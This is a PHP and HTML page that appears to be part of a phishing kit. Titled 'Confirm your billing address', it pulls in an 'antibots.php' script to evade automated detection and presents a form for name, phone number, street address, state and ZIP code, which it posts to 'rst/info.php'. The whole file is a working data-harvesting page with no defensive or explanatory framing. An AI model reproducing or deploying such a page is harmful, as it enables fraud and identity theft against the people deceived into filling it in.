<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Confirm your billing address</title>
<link href="img/fav.png" rel="shortcut icon">
<link href="css/info.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="wb_Form1" style="position:absolute;left:1px;top:0px;width:1327px;height:772px;z-index:9;">
<form action="rst/info.php" method="POST">
<input type="text" required="" id="Editbox1" style="position:absolute;left:31px;top:309px;width:611px;height:36px;line-height:36px;z-index:0;" name="1" value="" placeholder="First Name">
<input type="text" required="" id="Editbox2" style="position:absolute;left:31px;top:372px;width:611px;height:37px;line-height:37px;z-index:1;" name="2" value="" placeholder="Last Name">
<input type="text" required="" id="Editbox3" style="position:absolute;left:31px;top:435px;width:611px;height:37px;line-height:37px;z-index:2;" name="3" value="" minlength="9" maxlength="15" placeholder="Phone Ex: (xxx)-xxx-xxxx">
<input type="text" required="" id="Editbox4" style="position:absolute;left:694px;top:309px;width:611px;height:36px;line-height:36px;z-index:3;" name="4" value="" placeholder="Street address">
<input type="text" id="Editbox5" style="position:absolute;left:694px;top:372px;width:611px;height:37px;line-height:37px;z-index:4;" name="5" value="" placeholder="Apt,suite,bldg,c/o (optional)">
<select name="6" size="1" id="Combobox1" style="position:absolute;left:694px;top:435px;width:219px;height:39px;z-index:5;">
<option value="AL">Alabama</option>
<option value="AK">Alaska</option>
<option value="AZ">Arizona</option>
<option value="AR">Arkansas</option>
<option value="CA">California</option>
<option value="CO">Colorado</option>
<option value="CT">Connecticut</option>
<option value="DE">Delaware</option>
<option value="FL">Florida</option>
<option value="GA">Georgia</option>
<option value="HI">Hawaii</option>
<option value="ID">Idaho</option>
<option value="IL">Illinois</option>
<option value="IN">Indiana</option>
<option value="IA">Iowa</option>
<option value="KS">Kansas</option>
<option value="KY">Kentucky</option>
<option value="LA">Louisiana</option>
<option value="ME">Maine</option>
<option value="MD">Maryland</option>
<option value="MA">Massachusetts</option>
<option value="MI">Michigan</option>
<option value="MN">Minnesota</option>
<option value="MS">Mississippi</option>
<option value="MO">Missouri</option>
<option value="MT">Montana</option>
<option value="NE">Nebraska</option>
<option value="NV">Nevada</option>
<option value="NH">New Hampshire</option>
<option value="NJ">New Jersey</option>
<option value="NM">New Mexico</option>
<option value="NY">New York</option>
<option value="NC">North Carolina</option>
<option value="ND">North Dakota</option>
<option value="OH">Ohio</option>
<option value="OK">Oklahoma</option>
<option value="OR">Oregon</option>
<option value="PA">Pennsylvania</option>
<option value="RI">Rhode Island</option>
<option value="SC">South Carolina</option>
<option value="SD">South Dakota</option>
<option value="TN">Tennessee</option>
<option value="TX">Texas</option>
<option value="UT">Utah</option>
<option value="VT">Vermont</option>
<option value="VA">Virginia</option>
<option value="WA">Washington</option>
<option value="WV">West Virginia</option>
<option value="WI">Wisconsin</option>
<option value="WY">Wyoming</option>
</select>
<div id="wb_Text1" style="position:absolute;left:695px;top:420px;width:42px;height:15px;z-index:6;text-align:left;">
<span style="color:#A9A9A9;font-family:Arial;font-size:12px;">State</span></div>
<input type="text" required="" id="Editbox6" style="position:absolute;left:1099px;top:435px;width:207px;height:37px;line-height:37px;z-index:7;" name="7" value="" minlength="4" maxlength="10" placeholder="ZIP Code">
<input type="submit" id="Button1" name="" value=" " style="position:absolute;left:1142px;top:564px;width:175px;height:38px;z-index:8;cursor:pointer;">
</form>
</div>
</body>
</html>